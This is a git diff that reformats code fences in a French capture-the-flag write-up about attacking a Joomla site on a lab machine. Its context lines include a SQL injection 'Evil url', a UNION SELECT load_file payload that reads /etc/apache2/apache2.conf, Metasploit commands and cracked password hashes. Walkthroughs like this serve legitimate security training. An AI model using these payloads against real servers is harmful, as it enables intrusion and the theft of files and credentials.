@@ -12,7 +12,7 @@ Il s'avère que les autres personnes ayant résolu ce challenge ont découvert l
 
 En effet, lorsque l'on scanne la cible on obtient les résultats suivants :  
 
-```plain
+```
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-01 19:01 CEST
 Nmap scan report for 192.168.1.91
 Host is up (0.00025s latency).
@@ -96,7 +96,7 @@ Une fois le port 666 ouvert (on relance des scans, jusqu'à avoir de la chance, 
 
 On tombe sur une installation *Joomla* (un site sur lequel on voit une signature "Joomla templates" en bas. *Metasploit* a plusieurs modules pour ce CMS :  
 
-```plain
+```
 msf> use auxiliary/scanner/http/joomla_plugins
 msf auxiliary(joomla_plugins) > show options
 
@@ -136,7 +136,7 @@ msf auxiliary(joomla_plugins) > exploit
 
 Le script *Metasploit* crashe à ce moment j'ai au moins il a détecté quelque chose. Au passage *Wapiti* trouve aussi la vulnérabilité mais via une autre variable :
 
-```plain
+```
 Injection MySQL dans http://192.168.1.91:666/index.php via une injection dans le paramètre letter
   Evil url: http://192.168.1.91:666/index.php?option=com_abc&view=abc&letter=%BF%27%22%28&Itemid=3
 ```
@@ -145,7 +145,7 @@ Sur *exploit-db* on trouve [un exploit qui permet de récolter les hashs des uti
 
 On obtient rapidement un premier hash et plus tard un second mais le dernier semble inaccessible :  
 
-```plain
+```
 Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 AVX intrinsics 10x4x3])
 matrix           (JSmith)
 victim           (BTallor)
@@ -155,13 +155,13 @@ Cela dis, même avec ces comptes on ne trouve pas grand chose d'intéressant dan
 
 On customize un peu l'injection SQL indiquée dans l'exploit en changeant le paramètre de la variable *sectionid*. De cette façon on peut lire le contenu de fichiers sur le système :  
 
-```plain
+```
 -null+union+select+1,load_file(%27/etc/apache2/apache2.conf%27)+from+jos_users--
 ```
 
 La config est basée sur le dossier *sites-enabled* comme sous *openSUSE*. On tente le fichier *default* (*sites-available/default*) :  
 
-```plain
+```
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
 
@@ -304,7 +304,7 @@ A priori les ports sont 1001, 1101, 1011 puis 1001 pour provoquer l'ouverture du
 
 À noter que le fichier de configuration de [knockkock](http://www.thoughtcrime.org/software/knockknock/) présent sur le système ne correspond pas à ces ports :  
 
-```plain
+```
 [options]
         UseSyslog
 
